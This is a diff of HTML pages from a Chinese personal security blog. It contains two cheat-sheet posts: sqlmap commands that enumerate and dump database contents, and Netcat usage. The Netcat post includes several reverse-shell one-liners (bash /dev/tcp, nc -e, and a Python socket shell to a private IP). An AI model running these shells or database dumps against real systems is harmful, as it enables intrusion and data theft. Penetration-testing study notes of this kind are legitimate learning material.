+            <a href="/2021/11/12/sqlmap%E5%B7%A5%E5%85%B7/" class="post-title-link" itemprop="url">sqlmap工具</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-11-12 08:17:08" itemprop="dateCreated datePublished" datetime="2021-11-12T08:17:08+08:00">2021-11-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-11-15 22:16:03" itemprop="dateModified" datetime="2021-11-15T22:16:03+08:00">2021-11-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
       </header>
+
     
-    <div class="article-entry" itemprop="articleBody">
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
-        <h2 id="SQLmap："><a href="#SQLmap：" class="headerlink" title="SQLmap："></a><strong>SQLmap：</strong></h2><p><strong>SQLmap参数：</strong></p>
+          <h2 id="SQLmap："><a href="#SQLmap：" class="headerlink" title="SQLmap："></a><strong>SQLmap：</strong></h2><p><strong>SQLmap参数：</strong></p>
 <p>-u  URL=URL目标URL</p>
 <p>-r 通过文本来进行探测（抓取数据复制到文本）</p>
 <p>-g Google dork将Google dork结果处理为目标URL</p>
@@ -451,68 +658,103 @@
 <p> –batch                 批处理从不要求用户输入，请使用默认行为</p>
 <p><strong>SQLmap基本使用：</strong></p>
 <p>指定网页进行注入点探测</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式：sqlmap -u <span class="string">&#x27;URL&#x27;</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：sqlmap -u <span class="token string">'URL'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <img src="C:\Users\Joker\AppData\Roaming\Typora\typora-user-images\image-20211112093228640.png" alt="image-20211112093228640" style="zoom: 80%;" />
 
 <p>列出当前所有的库</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式：sqlmap -u <span class="string">&#x27;URL&#x27;</span> --dbs  </span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：sqlmap -u <span class="token string">'URL'</span> --dbs  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <img src="C:\Users\Joker\AppData\Roaming\Typora\typora-user-images\image-20211112095909984.png" alt="image-20211112095909984" style="zoom: 80%;" />
 
 <p>列出当前选中库的表</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式：sqlmap -u <span class="string">&#x27;URL&#x27;</span> -D <span class="string">&#x27;库&#x27;</span> --tables</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：sqlmap -u <span class="token string">'URL'</span> -D <span class="token string">'库'</span> --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <img src="C:\Users\Joker\AppData\Roaming\Typora\typora-user-images\image-20211112102011501.png" alt="image-20211112102011501"  />
 
 <p>列出当前选中表和库的字段</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式：sqlmap -u <span class="string">&#x27;URL&#x27;</span> -D <span class="string">&#x27;库&#x27;</span> -T <span class="string">&#x27;表&#x27;</span> --columns</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：sqlmap -u <span class="token string">'URL'</span> -D <span class="token string">'库'</span> -T <span class="token string">'表'</span> --columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <img src="C:\Users\Joker\AppData\Roaming\Typora\typora-user-images\image-20211112102540679.png" alt="image-20211112102540679" style="zoom: 80%;" />
 
 <p>列出当前选中表，库，字段的记录</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式：sqlmap -u <span class="string">&#x27;URL&#x27;</span> -D <span class="string">&#x27;库&#x27;</span> -T ‘表’ -C ‘字段’ --dump</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：sqlmap -u <span class="token string">'URL'</span> -D <span class="token string">'库'</span> -T ‘表’ -C ‘字段’ --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="C:\Users\Joker\AppData\Roaming\Typora\typora-user-images\image-20211112102818436.png" alt="image-20211112102818436"></p>
 
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/11/12/sqlmap%E5%B7%A5%E5%85%B7/" data-id="ckw0of75100083sjwa52q4xdn" class="article-share-link">Share</a>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/" rel="tag">渗透工具</a></li></ul>
-
-    </footer>
-  </div>
   
-</article>
-
-
   
-    <article id="post-netcat工具" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/11/10/netcat%E5%B7%A5%E5%85%B7/" class="article-date">
-  <time datetime="2021-11-10T00:34:32.000Z" itemprop="datePublished">2021-11-10</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/11/10/netcat%E5%B7%A5%E5%85%B7/">Netcat工具</a>
-    </h1>
-  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/10/netcat%E5%B7%A5%E5%85%B7/">
 
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Pokerface">
+      <meta itemprop="description" content="花有重开日，人无再少年。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pokerface博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/11/10/netcat%E5%B7%A5%E5%85%B7/" class="post-title-link" itemprop="url">Netcat工具</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-11-10 08:34:32" itemprop="dateCreated datePublished" datetime="2021-11-10T08:34:32+08:00">2021-11-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-11-15 22:15:58" itemprop="dateModified" datetime="2021-11-15T22:15:58+08:00">2021-11-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
       </header>
+
     
-    <div class="article-entry" itemprop="articleBody">
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
-        <h2 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h2><p><strong>Netcat参数：</strong></p>
+          <h2 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h2><p><strong>Netcat参数：</strong></p>
 <ol>
 <li>-c shell命令为“-e”；使用/bin/sh执行</li>
 <li>-e 文件名连接后要执行的程序</li>
@@ -535,22 +777,22 @@
 <p><strong>Netcat常见使用方法：</strong></p>
 <ol>
 <li><p>监听本地端口，以详细列出</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式：nc -lvvp [Port]</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：nc -lvvp <span class="token punctuation">[</span>Port<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="C:\Users\Joker\AppData\Roaming\Typora\typora-user-images\image-20211110101756668.png" alt="image-20211110101756668"></p>
 </li>
 <li><p>扫描目标指定端口范围开放状态</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式：nc -v -z [Ip] [Port] </span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：nc -v -z <span class="token punctuation">[</span>Ip<span class="token punctuation">]</span> <span class="token punctuation">[</span>Port<span class="token punctuation">]</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="C:\Users\Joker\AppData\Roaming\Typora\typora-user-images\image-20211110101659629.png" alt="image-20211110101659629"></p>
 </li>
 <li><p>UDP扫描端口并返回端口信息</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式：nc -v -z -u [Ip] [Port]</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：nc -v -z -u <span class="token punctuation">[</span>Ip<span class="token punctuation">]</span> <span class="token punctuation">[</span>Port<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="C:\Users\Joker\AppData\Roaming\Typora\typora-user-images\image-20211110102152054.png" alt="image-20211110102152054"></p>
 </li>
 <li><p>在目标机没有nc的情况下</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式：bash -i &gt;&amp; /dev/tcp/Ip/Port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：bash -i <span class="token operator">>&amp;</span> /dev/tcp/Ip/Port <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>本地机：</p>
 <p><img src="C:\Users\Joker\AppData\Roaming\Typora\typora-user-images\image-20211110154144997.png" alt="image-20211110154144997"></p>
@@ -558,142 +800,223 @@
 <p><img src="C:\Users\Joker\AppData\Roaming\Typora\typora-user-images\image-20211110154300121.png" alt="image-20211110154300121"></p>
 </li>
 <li><p>windows下反弹cmd</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式：nc [Ip] [Port] -e cmd.exe</span><br></pre></td></tr></table></figure></li>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：nc <span class="token punctuation">[</span>Ip<span class="token punctuation">]</span> <span class="token punctuation">[</span>Port<span class="token punctuation">]</span> -e cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 <li><p>linux下反弹cmd</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式：nc [Ip] [Port] -e /bin/sh</span><br></pre></td></tr></table></figure></li>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：nc <span class="token punctuation">[</span>Ip<span class="token punctuation">]</span> <span class="token punctuation">[</span>Port<span class="token punctuation">]</span> -e /bin/sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 <li><p>文件传输</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">格式：nc -lvvp 8888 &lt; 1.txt 服务端</span><br><span class="line">	 nc -vn [Ip] 8888 &gt; 1.txt 客户端</span><br></pre></td></tr></table></figure></li>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：nc -lvvp <span class="token number">8888</span> <span class="token operator">&lt;</span> <span class="token number">1</span>.txt 服务端
+	 <span class="token function">nc</span> -vn <span class="token punctuation">[</span>Ip<span class="token punctuation">]</span> <span class="token number">8888</span> <span class="token operator">></span> <span class="token number">1</span>.txt 客户端<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
 <li><p>nc反弹nc</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式：nc -e /bin/bash [Ip] [Port]</span><br></pre></td></tr></table></figure></li>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：nc -e /bin/bash <span class="token punctuation">[</span>Ip<span class="token punctuation">]</span> <span class="token punctuation">[</span>Port<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 <li><p>http请求（也可以进行ftp匿名探测）</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式：nc [Ip] [21]</span><br></pre></td></tr></table></figure></li>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：nc <span class="token punctuation">[</span>Ip<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 <li><p>python构造连接</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式：python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.11.144&quot;,2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure></li>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：python -c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.11.144",2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 </ol>
 
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/11/10/netcat%E5%B7%A5%E5%85%B7/" data-id="ckw0of74u00013sjw69e94811" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/" rel="tag">渗透工具</a></li></ul>
 
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Pokerface"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">Pokerface</p>
+  <div class="site-description" itemprop="description">花有重开日，人无再少年。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/pokerface927" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;pokerface927" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:codepoker@163.com" title="E-Mail → mailto:codepoker@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/yourname" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;yourname" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://plus.google.com/yourname" title="Google → https:&#x2F;&#x2F;plus.google.com&#x2F;yourname" rel="noopener" target="_blank"><i class="fab fa-google fa-fw"></i>Google</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Pokerface</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>-->
+
+        
+
+
+
+
+
+
+
+
+      </div>
     </footer>
   </div>
-  
-</article>
-
 
   
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
 
 
-</section>
-        
-          <aside id="sidebar">
-  
-    
+<script src="/js/schemes/pisces.js"></script>
 
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/" rel="tag">渗透工具</a></li></ul>
-    </div>
-  </div>
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+    <script defer src="/lib/three/canvas_sphere.min.js"></script>
 
 
   
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">渗透工具</a>
-    </div>
-  </div>
 
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li></ul>
-    </div>
-  </div>
+
 
 
   
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2021/11/15/hello-world/">Hello World</a>
-          </li>
-        
-          <li>
-            <a href="/2021/11/15/Msfvenom/">Msfvenom</a>
-          </li>
-        
-          <li>
-            <a href="/2021/11/15/Msfconsole/">Msfconsole</a>
-          </li>
-        
-          <li>
-            <a href="/2021/11/12/nmap%E5%B7%A5%E5%85%B7/">nmap扫描</a>
-          </li>
-        
-          <li>
-            <a href="/2021/11/12/sqlmap%E5%B7%A5%E5%85%B7/">sqlmap工具</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
 
   
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      &copy; 2021 John Doe<br>
-      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
-</footer>
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
 
-<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-
-  
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
-
-  
-<script src="/fancybox/jquery.fancybox.pack.js"></script>
-
-
-
-
-<script src="/js/script.js"></script>
-
-
-
-
-  </div>
 </body>
 </html>
